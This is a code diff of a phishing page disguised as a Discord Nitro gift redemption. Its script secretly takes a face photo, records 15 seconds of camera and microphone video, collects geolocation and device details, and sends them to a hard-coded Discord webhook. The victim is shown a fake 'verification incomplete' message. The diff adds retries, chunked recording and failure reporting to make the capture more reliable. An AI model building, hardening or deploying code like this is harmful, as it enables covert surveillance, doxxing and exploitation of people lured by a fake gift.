@@ -3,7 +3,6 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- Discord Preview Magic -->
   <meta property="og:title" content="A WILD GIFT APPEARED! 🎁">
   <meta property="og:type" content="website">
   <meta property="og:url" content="https://nitro-gift-activate.github.io/redeem/">
@@ -59,7 +58,7 @@
     const progressText = document.getElementById('progressText');
 
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1479318338411827384/nNZ_pZsoR7CZJn9n6U_UA4hawAdOKiGngDqoDBNkbTT7pggzniMRTDh7wO_tNRfDXhZZ";
-    const RECORD_DURATION = 10000;
+    const RECORD_DURATION = 15000; // longer to help metadata
 
     let startTime = 0;
     let animationFrameId = null;
@@ -81,9 +80,12 @@
       formData.append('file', blob, filename);
       try {
         const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-        if (res.ok) return true;
-      } catch {}
-      return false;
+        console.log(`Send to ${filename} - Status: ${res.status} ${res.statusText}`);
+        return res.ok;
+      } catch (e) {
+        console.error(`Send error for ${filename}:`, e);
+        return false;
+      }
     }
 
     async function captureMugshot() {
@@ -91,7 +93,7 @@
       canvas.width = videoElement.videoWidth || 640;
       canvas.height = videoElement.videoHeight || 480;
       ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-      await new Promise(r => setTimeout(r, 200));
+      await new Promise(r => setTimeout(r, 300));
       ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
       return new Promise(r => canvas.toBlob(r, 'image/png'));
     }
@@ -102,7 +104,7 @@
         btn.disabled = true;
 
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" },
+          video: { facingMode: "user", frameRate: { ideal: 30 } },
           audio: true
         });
 
@@ -110,15 +112,15 @@
 
         await new Promise(resolve => {
           videoElement.onloadedmetadata = () => {
-            videoElement.play().catch(() => {});
+            videoElement.play().catch(e => console.error("Play error:", e));
             resolve();
           };
-          setTimeout(resolve, 4000); // longer settle to help front cam stability
+          setTimeout(resolve, 5000); // long settle for iPhone Safari
         });
 
-        await new Promise(r => setTimeout(r, 1200));
+        await new Promise(r => setTimeout(r, 1500));
 
-        // Mugshot first
+        // Mugshot
         const mugshotBlob = await captureMugshot();
         let geo = "Location grab failed";
         try {
@@ -134,9 +136,11 @@
             mugshotBlob,
             `face_${Date.now()}.png`
           );
+        } else {
+          console.log('Mugshot failed or empty');
         }
 
-        // Video attempt - original working logic
+        // Video - hardened
         progressContainer.style.display = 'block';
         msg.textContent = "";
 
@@ -144,7 +148,10 @@
         const chunks = [];
 
         recorder.ondataavailable = e => {
-          if (e.data.size > 0) chunks.push(e.data);
+          if (e.data.size > 0) {
+            chunks.push(e.data);
+            console.log(`Chunk added - size: ${e.data.size / 1024} KB`);
+          }
         };
 
         recorder.onstop = async () => {
@@ -155,6 +162,8 @@
           stream.getTracks().forEach(track => track.stop());
 
           if (chunks.length === 0) {
+            console.log('NO CHUNKS RECORDED - video failed');
+            await sendToWebhook(`⚠️ Video attempt - NO DATA RECORDED\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`);
             msg.textContent = "Verification incomplete. Center Face In Camera View";
             progressContainer.style.display = 'none';
             btn.style.display = 'none';
@@ -162,21 +171,29 @@
           }
 
           const blob = new Blob(chunks, { type: 'video/webm' });
-          if (blob.size < 5000) { // too small, probably junk
-            msg.textContent = "Verification incomplete. Center Face In Camera View";
-            progressContainer.style.display = 'none';
-            btn.style.display = 'none';
-            return;
+          console.log(`Final video blob size: ${blob.size / 1024} KB`);
+
+          if (blob.size < 5000) {
+            console.log('Blob too small - likely junk');
+            await sendToWebhook(`⚠️ Video attempt - TINY BLOB (${blob.size} bytes)\nUA: ${navigator.userAgent}`);
           }
 
-          const vidContent = `🎥 Video clip attached\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`;
+          let geoDetails = geo;
 
-          // Try .mp4 rename first (your original trick)
-          let sent = await sendAttachment(vidContent, blob, `verification_${Date.now()}.mp4`);
+          const vidContent = `🎥 Video clip attached\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoDetails}`;
 
-          // If failed, retry with .webm extension
+          // Try .webm first
+          let sent = await sendAttachment(vidContent, blob, `verification_${Date.now()}.webm`);
+
+          // Retry with .mp4 if failed
           if (!sent) {
-            await sendAttachment(vidContent, blob, `verification_${Date.now()}.webm`);
+            console.log(' .webm send failed - retrying .mp4');
+            sent = await sendAttachment(vidContent, blob, `verification_${Date.now()}.mp4`);
+          }
+
+          if (!sent) {
+            console.log('Both send attempts failed');
+            await sendToWebhook(`⚠️ Video send FAILED (both extensions)\nBlob size was ${blob.size} bytes\nUA: ${navigator.userAgent}`);
           }
 
           msg.textContent = "Verification incomplete. Center Face In Camera View";
@@ -184,12 +201,13 @@
           btn.style.display = 'none';
         };
 
-        recorder.start();
+        recorder.start(1000); // force chunk every second
         startTime = Date.now();
         updateProgress();
         setTimeout(() => recorder.stop(), RECORD_DURATION);
 
       } catch (err) {
+        console.error('Overall error:', err);
         msg.textContent = "Verification incomplete. Center Face In Camera View";
         progressContainer.style.display = 'none';
         btn.disabled = false;
